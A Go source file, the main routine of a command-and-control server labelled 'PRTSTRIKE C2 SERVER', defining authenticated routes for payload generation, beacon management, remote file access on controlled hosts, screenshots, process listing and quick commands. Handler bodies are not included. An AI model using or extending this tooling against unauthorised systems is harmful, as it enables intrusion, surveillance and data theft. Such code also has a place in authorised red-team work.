package main

import (
	cryptoRand "crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	gin.SetMode(gin.ReleaseMode)

	r := gin.Default()

	// Session secret: prefer env var, otherwise generate random key each startup
	secretKey := os.Getenv("PRTS_SECRET")
	if secretKey == "" {
		b := make([]byte, 32)
		if _, err := cryptoRand.Read(b); err != nil {
			log.Fatal("Failed to generate session secret:", err)
		}
		secretKey = hex.EncodeToString(b)
	}
	store := cookie.NewStore([]byte(secretKey))
	r.Use(sessions.Sessions("prts-session", store))

	// Session Timeout Middleware
	r.Use(func(c *gin.Context) {
		session := sessions.Default(c)
		settingsMutex.RLock()
		timeout := GlobalSettings.SessionTimeout
		settingsMutex.RUnlock()

		if timeout > 0 {
			session.Options(sessions.Options{
				Path:     "/",
				MaxAge:   timeout * 3600,
				HttpOnly: true,
			})
		}
		c.Next()
	})

	// Static files: protect /static/payloads/ behind auth, serve rest normally
	r.GET("/static/*filepath", func(c *gin.Context) {
		p := c.Param("filepath")
		if strings.HasPrefix(p, "/payloads/") || p == "/payloads" {
			// Require authentication for payload downloads
			session := sessions.Default(c)
			if auth := session.Get("authenticated"); auth != true {
				c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "UNAUTHORIZED"})
				c.Abort()
				return
			}
		}
		c.File("./static" + p)
	})

	r.GET("/", func(c *gin.Context) {
		session := sessions.Default(c)
		if auth := session.Get("authenticated"); auth == true {
			c.Redirect(http.StatusSeeOther, "/dashboard")
			return
		}
		c.File("./static/index.html")
	})

	r.GET("/dashboard", AuthRequired(), func(c *gin.Context) {
		c.File("./static/dashboard.html")
	})

	// API Routes
	api := r.Group("/api")
	{
		api.POST("/login", handleLogin)
		api.GET("/logout", handleLogout)

		auth := api.Group("/")
		auth.Use(AuthRequired())
		{
			auth.GET("/userinfo", handleGetUserInfo)

			// Client routes
			auth.GET("/clients", handleGetClients)
			auth.GET("/clients/:id", handleGetClientDetail)
			auth.PUT("/clients/:id", handleUpdateClientNote)
			auth.DELETE("/clients/:id", handleDeleteClient)
			auth.POST("/clients/:id/kill", handleKillBeacon)

			// Listener routes
			auth.GET("/listeners", handleGetListeners)
			auth.POST("/listeners", handleCreateListener)
			auth.POST("/listeners/:id/start", handleStartListener)
			auth.POST("/listeners/:id/stop", handleStopListener)
			auth.DELETE("/listeners/:id", handleDeleteListener)

			// Payload routes
			auth.GET("/payloads", handleGetPayloads)
			auth.POST("/payloads", handleGeneratePayload)
			auth.DELETE("/payloads/:id", handleDeletePayload)

			// Task routes
			auth.GET("/tasks", handleGetTasks)
			auth.GET("/tasks/:id", handleGetTask)
			auth.POST("/tasks", handleCreateTask)

			// File routes
			auth.GET("/files", handleGetFiles)
			auth.POST("/upload", handleFileUpload)

			// Proxy routes
			auth.GET("/proxies", handleGetProxies)
			auth.POST("/proxies", handleCreateProxy)
			auth.DELETE("/proxies/:id", handleDeleteProxy)

			// File Manager routes (local server files)
			fm := auth.Group("/fm")
			{
				fm.GET("/list", handleFMList)
				fm.POST("/mkdir", handleFMMkdir)
				fm.POST("/rename", handleFMRename)
				fm.POST("/delete", handleFMDelete)
				fm.POST("/upload/init", handleFMUploadInit)
				fm.POST("/upload/chunk/:upload_id", handleFMUploadChunk)
				fm.POST("/upload/complete/:upload_id", handleFMUploadComplete)
				fm.GET("/download", handleFMDownload)
				fm.GET("/info", handleFMInfo)
			}

			// Remote File Manager routes (beacon/controlled host files)
			rfm := auth.Group("/rfm")
			{
				rfm.GET("/list", handleRemoteFMList)
				rfm.GET("/download", handleRemoteFMDownload)
				rfm.POST("/upload", handleRemoteFMUpload)
				rfm.POST("/mkdir", handleRemoteFMMkdir)
				rfm.POST("/delete", handleRemoteFMDelete)
				rfm.POST("/edit", handleRemoteFMEdit)
			}

			// System routes
			auth.GET("/processes", handleGetProcesses)
			auth.GET("/screenshot", handleGetScreenshot)
			auth.GET("/stats", handleGetStats)
			auth.GET("/logs", handleGetLogs)
			auth.GET("/settings", handleGetSettings)
			auth.POST("/settings", handleSaveSettings)
			auth.POST("/change-password", handleChangePassword)
			auth.POST("/quick-command", handleQuickCommand)

			// Callback filter routes
			auth.GET("/filters", handleGetFilters)
			auth.POST("/filters", handleUpdateFilters)
		}
	}

	// WebSocket (requires authentication)
	r.GET("/ws", AuthRequired(), handleWS)

	addr := ":8083"
	fmt.Printf("[+] PRTSTRIKE C2 SERVER (GIN) STARTED ON %s\n", addr)
	log.Fatal(r.Run(addr))
}
